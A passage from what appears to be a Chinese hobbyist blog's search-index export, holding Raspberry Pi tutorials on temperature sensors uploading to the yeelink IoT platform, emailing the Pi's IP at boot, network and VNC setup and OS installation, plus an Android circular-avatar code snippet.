continuewhile j &lt; 40: k = 0 while GPIO.input(channel) == GPIO.LOW: continue while GPIO.input(channel) == GPIO.HIGH: k += 1 if k &gt; 100: break if k &lt; 8: data.append(0) else: data.append(1) j += 1print &quot;sensor is working.&quot;print data#读取数值humidity_bit = data[0:8]humidity_point_bit = data[8:16]temperature_bit = data[16:24]temperature_point_bit = data[24:32]check_bit = data[32:40]humidity = 0humidity_point = 0temperature = 0temperature_point = 0check = 0#转换数值for i in range(8): humidity += humidity_bit[i] * 2 ** (7 - i) humidity_point += humidity_point_bit[i] * 2 ** (7 - i) temperature += temperature_bit[i] * 2 ** (7 - i) temperature_point += temperature_point_bit[i] * 2 ** (7 - i) check += check_bit[i] * 2 ** (7 - i)tmp = humidity + humidity_point + temperature + temperature_point#数据校验if check == tmp: print &quot;temperature : &quot;, temperature, &quot;, humidity : &quot; , humidityelse: print &quot;wrong&quot; print &quot;temperature : &quot;, temperature, &quot;, humidity : &quot; , humidity, &quot; check : &quot;, check, &quot; tmp : &quot;, tmpGPIO.cleanup() 在python文件的路径下输入命令： 1sudo python ./dht11.py 即可获得数据，效果如图： 可以看到，当校验不正确时会打印出“wrong”，表示数据错误，在读取一次得到正常的数据。 上传数据到yeelink修改python代码在上面的代码后添加如下代码，即将温度和湿度数据保存到txt文件里： 123456789101112131415#数据转换成JSON格式mytemp = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %temperaturemyhumi = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %humidity#打开文件tmp_output = open(&apos;/home/pi/mytest/DHT11/tmp_data.txt&apos;, &apos;w&apos;)hud_output = open(&apos;/home/pi/mytest/DHT11/hud_data.txt&apos;, &apos;w&apos;)#写数据到文本文件中tmp_output.write(mytemp)hud_output.write(myhumi)#关闭文件tmp_output.closehud_output.close 新增yeelink.sh脚本yeelink是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了API接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：《 树莓派+USB摄像头+yeelink实现云监控》。 1234sudo python /home/pi/mytest/DHT11/dht11.pycurl --request POST --data-binary @&quot;/home/pi/mytest/DHT11/tmp_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapointssleep 10scurl --request POST --data-binary @&quot;/home/pi/mytest/DHT11/hud_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints “/home/pi/mytest/DHT11/tmp_data.txt”是需要上传到yeelink上的文件的路径，将XXXXXXXXXXXXXXXX替换为自已账户的API Key，后面的URL也需要替换为自己申请的传感器URL。 注意：因为DHT11可以获得温度和湿度两种值，所以我在yeelink添加了两个传感器，便于观察，在这里有两次上传数据，分别是把储存温度值得txt文本和储存湿度值得txt文本通过HTTP协议上传到云端。 为脚本增加可执行权限1sudo chmod +x yeelink.sh 将脚本加入cronjob定时任务1sudo crontab -e 让脚本自动运行加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次数据，然后保存退出 1*/1 * * * * /home/pi/mytest/yeelink.sh 注：我给自己的实验新建了几个文件夹，路径如下：/home/pi/mytest/DHT11/，很多操作都是在这个路径下完成的。 实验效果： 温度： 湿度：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,DHT11,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+DS18B20温度传感器+yeelink物联网云]]></title>
    <url>%2F2016%2F05%2F30%2F%E6%A0%91%E8%8E%93%E6%B4%BE-DS18B20%E6%B8%A9%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-yeelink%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91%2F</url>
    <content type="text"><![CDATA[本博文参考了网络上多篇树莓派操作DS18B20的博文，经过博主亲自实践，列出了详细的步骤，通过树莓派的单总线驱动来驱动DS18B20获取温度数据，并通过python读取温度值，上传到yeelink物联网云平台。 配置准备电路连接DS18B20有三个引脚：VCC，DQ，GND 其中VCC和DQ之间需接一个4K7的电阻，VCC接树莓派的3V3（pin1），DQ接GPIO4（pin7）,GND接GND（pin6） 升级内核首先升级内核(如果系统版本较新，可跳过这一步)（升级内核可能需要很长的时间）12sudo apt-get updatesudo apt-get upgrade 加载单总线驱动12sudo modprobe w1-gpiosudo modprobe w1-therm 注意： 系统升级后，有可能gpio读不了w1 解决办法： 打开/boot/config.txt 在最后一行手动添加这一行：dtoverlay=w1-gpio-pullup,gpiopin=4 12cd /bootsudo nano config.txt 然后保存退出，重启树莓派，再把DS18B20接上，再次加载驱动即可 查看设备是否工作12cd /sys/bus/w1/devices/ls 28-0000075a0d1c即为我使用的DS18B20的设备号 查看当前温度值进入到我的DSI8B20，使用命令查看数据 12cd 28-0000075a0d1ccat w1_slave 第二行的t=18437就是当前的温度值，要换算成摄氏度，除以1000，即当前温度为18437/1000=18.437摄氏度。 python读取温度值新建文件在/home/pi/目录下新建文件夹mytest，并在mytest下新建temp.py 123mkdir mytestcd mytesttouch temp.py 编辑temp.py1nano temp.py 编写代码123456789101112131415161718192021222324#-*-coding:utf8-*-#打开你的DS18B20的数据文件tfile = open(&quot;/sys/bus/w1/devices/28-0000075a0d1c/w1_slave&quot;)#读取文件所有内容text = tfile.read()#关闭文件tfile.close()#用换行符分割字符串成数组，并取第二行secondline = text.split(&quot;\n&quot;)[1]#用空格分割字符串成数组，并取最后一个，即t=18437temperaturedata = secondline.split(&quot; &quot;)[9]#取t=后面的数值，并转换为浮点型temperature = float(temperaturedata[2:])#转换单位为摄氏度temperature = temperature / 1000#打印值print temperature 执行python脚本读取温度1python temp.py 上传数据到yeelink云端yeelink是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了API接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：《 树莓派+USB摄像头+yeelink实现云监控》。 修改python代码将温度值用JSON格式保存到一个文本文件（/home/pi/mytest/temper_data.txt），在转换单位为摄氏度后添加如下代码： 1234567891011#数据转换成JSON格式res = &apos;&#123;&quot;value&quot;:%f&#125;&apos; %temperature#打开文件output = open(&apos;/home/pi/mytest/temper_data.txt&apos;, &apos;w&apos;)#写数据到文本文件中output.write(res)#关闭文件output.close 新增yeelink.sh脚本在/home/pi/mytest/目录下新建yeelink.sh 写入如下内容： 12sudo python /home/pi/mytest/temp.pycurl --request POST --data-binary @&quot;/home/pi/mytest/temper_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints 将XXXXXXXXXXXXXXXX替换为自已账户的API Key，后面的URL也需要替换为自己申请的传感器URL。 为脚本增加可执行权限1sudo chmod +x yeelink.sh 将脚本加入cronjob定时任务1sudo crontab -e 让脚本自动运行加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次温度数据，然后保存退出 1*/1 * * * * /home/pi/mytest/yeelink.sh 实验效果：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,DS18B20,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派自动发送ip到指定邮箱]]></title>
    <url>%2F2016%2F05%2F26%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81ip%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[知道树莓派的ip地址才能通过SSH或者VNC在你的电脑上操作树莓派，树莓派开机自动发送ip地址到指定邮箱会让你使用树莓派更加方便！ 新建一个python脚本文件输入命令 1touch send_ip.py 编写python脚本（1）输入命令 1sudo vim send_ip.py （2）写入以下代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!\usr\bin\env python#-*-coding: utf-8-*-import socketimport timeimport smtplibimport urllibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextfrom email.mime.image import MIMEImage#发送邮件的基本函数，参数依次如下# smtp服务器地址、邮箱用户名，邮箱秘密，发件人地址，手贱儿女地址（列表的方式），邮件主题，邮件html内容def sendEmail(smtpserver,username,password,sender,receiver,subject,msghtml): msgRoot =MIMEMultipart(&apos;reklated&apos;) msgRoot[&apos;To&apos;]=&apos;,&apos;.join(receiver) msgRoot[&apos;Subject&apos;]= subject msgText = MIMEText(msghtml,&apos;html&apos;,&apos;utf-8&apos;) msgRoot.attach(msgText) smtp = smtplib.SMTP() smtp.connect(smtpserver,&quot;25&quot;) smtp.login(username,password) print &quot;YES&quot; smtp.quit()#检查网络连通性def check_network(): while True: try: result=urllib.urlopen(&apos;http://baidu.com&apos;).read() print result print &quot;Network is Ready!&quot; break except Exception , e: print e print &quot;Network is not ready,Sleep 5s...&quot; time.sleep(5) return True#获取本级制定接口的ip地址def get_ip_address(): s =socket.socket(socket.AF_INET,socket.SOCK_DGRAM) s.connect((&quot;1.1.1.1&quot;,80)) ipaddr=s.getsockname()[0] s.close() return ipaddrif __name__ == &apos;__main__&apos; : check_network() ipaddr= get_ip_address() sendEmail(&quot;smtp.sohu.com&quot;,&apos;你的邮箱帐号&apos;,&apos;你的邮箱密码&apos;,&apos;发件人地址&apos;,[&apos;收件人地址&apos;],&apos;IP Address of Raspberry PI&apos;,ipaddr) （3）保存退出 vim编辑器下保存退出步骤为： 按esc然后输入：，然后看到冒号显示出来再输入wq，回车即可 设置开机自动执行该脚本在/etc/rc.local文件里加入下面这一行： 1/usr/bin/python/home/pi/send_ip.py 输入命令： 1sudo vim /etc/rc.local 在文件中添加/usr/bin/python/home/pi/send_ip.py然后保存退出 特别提示：收到的邮件有可能在垃圾箱里，不要以为是脚本的问题，其实是邮箱的问题，请注意查看！另外，有的邮箱不支持smtp，所以无法使用。搜狐和网易的邮箱亲测可用。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,ip］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派网线直连笔记本电脑]]></title>
    <url>%2F2016%2F05%2F23%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E7%BD%91%E7%BA%BF%E7%9B%B4%E8%BF%9E%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%94%B5%E8%84%91%2F</url>
    <content type="text"><![CDATA[查看网络连接状况运行DOS窗口，输入arp -a，可以看到没有连接树莓派时的网络连接情况。红色方框为笔记本连接无线网络的网络信息。 连线树莓派接好供电线；将网线一端接到树莓派，另一端接到笔记本。 共享无线网络如果现在笔记本已经通过WIFI连接到互联网，可以将无线网卡的互联网资源共享给本地连接。以win7系统为例，开始——控制面板——网络和Internet——网络和共享中心——查看网络状态和任务——更改适配器设置，找到无线网络连接右键“属性”，在共享选项卡上选中“允许其他网络用户通过此计算机的Internet连接来连接（N）”选项，下拉列表选择树莓派的那个网络，最后点确定。 查找树莓派的IP地址运行DOS窗口，输入arp -a，在这里可以看到在笔记本无线网络信息的上面（红色标注）多出来一个接口（蓝色标注），黄色标注的ip地址即为树莓派的ip地址。 利用Xshell或者PuTTY软件连接树莓派通过树莓派的ip地址登录到树莓派，树莓派的默认账号为pi，密码为raspberry。登录后可以看到树莓派操作系统的命令行界面。 图形化界面连接树莓派端： 在命令行界面安装VNCserver （1）安装VNC 1sudo apt-get install tightvncserver （2）增加一个桌面 1tightvncserver （3）启动VNC服务器 1vncserver 首次使用时需设置密码，当提示输入密码时，创建一个密码 (这个密码是远程用户访问时用的） （4）关闭VNC服务器 1vncserver -kill PC端： 在windows上下载安装下载VNC viewer地址http://www.tightvnc.com/download.php： （1）下载Window版的 VNC-Viewer ，无需安装，解压即可。 比如，解压出：VNC-Viewer-5.0.3-Windows-32bit.exe 。 （2）运行 VNC-Viewer 。 （3）输入树莓派的ip地址以及访问密码，即可登录到树莓派，并显示图形化界面。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派配置无线网卡]]></title>
    <url>%2F2016%2F05%2F22%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[查看无线网卡状态把无线网卡插到树莓派上，输入命令ifconfig 查看是否有wlan0的信息，如果有说明网卡状态正常，可以直接进行第二步，直接配置无线网络。如果看不到wlan0的信息，则需要根据无线网卡型号安装驱动。 修改interfaces文件（1）用编辑器nano打开interfaces文件输入命令：sudo nano /etc/network/interfaces （2）把该文件内容修改成如下： 12345678910auto lo iface lo inet loopbackiface eth0 inet dhcp #采用dhcp方式获取IPauto wlan0 #如果有wlan，无线网卡，则默认启动无线网卡连接allow-hotplug wlan0 #表示wlan设备可以热插拨iface wlan0 inet dhcp #无线网卡连接也采用DHCP方式获取IP地址wpa-ssid &quot;你的wifi名字&quot; #ssid名wpa-psk &quot;wifi密码&quot; #wifi使用wpa-psk认证方式，认证密码iface default inet dhcp （3）保存，退出 启用无线网（1）用 ifconfig 命令可以看到 wlan0 设备，且有了IP地址(即表示已连接)。 （2）如果没有IP地址，则依次输入命令：sudo ifdown wlan0和sudo ifup wlan0来启用wlan0 （3）如果还不行，执行命令sudo reboot重启即可连上无线网络]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,无线］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派安装Linux操作系统]]></title>
    <url>%2F2016%2F05%2F18%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[树莓派上可安装的操作系统（1）Linux：Raspbian,Arch Linux ARM （2）Unix：FreeBSD,NetBSD （3）Windows: Windows 10 for Raspberry Pi 2 其中： 使用最广泛：Raspbian——基于Debian，为树莓派优化 强调定制性：Arch Linux ARM——为轻量，简洁，定制而生 Raspbmc——用Kodi（XBMC/Xbox Media Center）打造多媒体中心 Chromium OS——云端操作系统，中国大陆用户不方便使用 Windows 10 loT物联网版本 Linux操作系统安装方法使用NOOBS来安装系统（1）将TF卡格式化为FAT32格式 注意：TF（micro SD）卡需要大于等于4GB，而且并不是所有TF卡都能兼容树莓派，需百度查询兼容性列表 （2） 到树莓派官网下载NOOBS（进入主页后点击DOWNLOAD就可以看到NOOBS了） （3）将NOOBS解压后的所有文件拷贝到TF卡的根目录下 （4）连接显示器，并给树莓派上电（5V，2A电源，也可直接使用电脑的USB插口） （5）初始化完成以后，你会进入NOOBS助手界面 （6）选择你需要安装的操作系统，然后点击上方的install OS即可进入安装 （7）完成后点击确认，然后Raspberry Pi会重启，至此系统安装完成 直接安装Linux系统到SD卡（1）到树莓派官网下载你需要的官方系统镜像 （2）下载安装镜像的工具win32diskimager （3）运行Win32DiskImager，在软件中选择系统镜像（img文件），然后device(设备）下选择TF卡盘符，点击write，等待写入完全，等到出现对话框write successful就说明成功了。 注意：写入完成后，win系统下看到SD只有几十MB了，这是正常现象，因为linux下的分区win下是看不到的！ （4）连接显示器，并给树莓派上电，至此系统安装完成]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,Linux］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android ImageView实现圆形头像]]></title>
    <url>%2F2016%2F05%2F17%2FAndroid-ImageView%E5%AE%9E%E7%8E%B0%E5%9C%86%E5%BD%A2%E5%A4%B4%E5%83%8F%2F</url>
    <content type="text"><![CDATA[原理解析先在canvas上面画一个圆形，参照圆形的起点坐标、半径，再画一个边长为圆的直径的bitmap（这个bitmap就是你想画的圆形头像），此时圆和bitmap重叠在一起，圆在下面，bitmap在上面，bitmap覆盖着圆。 这时，圆形和bitmap相交的部分正是圆大小的面积，如果能将bitmap与圆相交之外的部分去掉，那么我们看到的就是bitmap的圆形部分了。 代码实现1234567891011121314151617181920212223242526272829303132public Bitmap toRoundBitmap(Bitmap bitmap) &#123; //圆形图片宽高 int width = bitmap.getWidth(); int height = bitmap.getHeight(); //正方形的边长 int r = 0; //取最短边做边长 if(width &amp;amp;amp;gt; height) &#123; r = height; &#125; else &#123; r = width; &#125; //构建一个bitmap Bitmap backgroundBmp = Bitmap.createBitmap(width, height, Config.ARGB_8888); //new一个Canvas，在backgroundBmp上画图 Canvas canvas = new Canvas(backgroundBmp); Paint paint = new Paint(); //设置边缘光滑，去掉锯齿 paint.setAntiAlias(true); //宽高相等，即正方形 RectF rect = new RectF(0, 0, r, r); //通过制定的rect画一个圆角矩形，当圆角X轴方向的半径等于Y轴方向的半径时， //且都等于r/2时，画出来的圆角矩形就是圆形 canvas.drawRoundRect(rect, r/2, r/2, paint); //设置当两个图形相交时的模式，SRC_IN为取SRC图形相交的部分，多余的将被去掉 paint.setXfermode(new PorterDuffXfermode(Mode.SRC_IN)); //canvas将bitmap画在backgroundBmp上 canvas.drawBitmap(bitmap, null, rect, paint); //返回已经绘画好的backgroundBmp return backgroundBmp; &#125; 使用详解从res目录下的drawable文件夹获取图片资源进行转换1234567891011// 以数据流的方式读取bitmap资源Resources r = this.getResources();InputStream is = r.openRawResource(R.drawable.iv_head);BitmapDrawable bmpDraw = new BitmapDrawable(is);Bitmap bmp = bmpDraw.getBitmap(); // 将图片转换成圆形图片Bitmap bm = toRoundBitmap(bmp); //传给imagview进行显示imageview.setImageBitmap(bm); 从sdcard中获取图片资源进行转换注意：需添加sdcard读取数据的权限 1234567Bitmap bmp = BitmapFactory.decodeFile(path) (path 是图片的路径，根目录是/sdcard) // 将图片转换成圆形图片Bitmap bm = toRoundBitmap(bmp); //传给imagview进行显示imageview.setImageBitmap(bm);]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,ImageView］</tag>
      </tags>
  </entry>
</search>
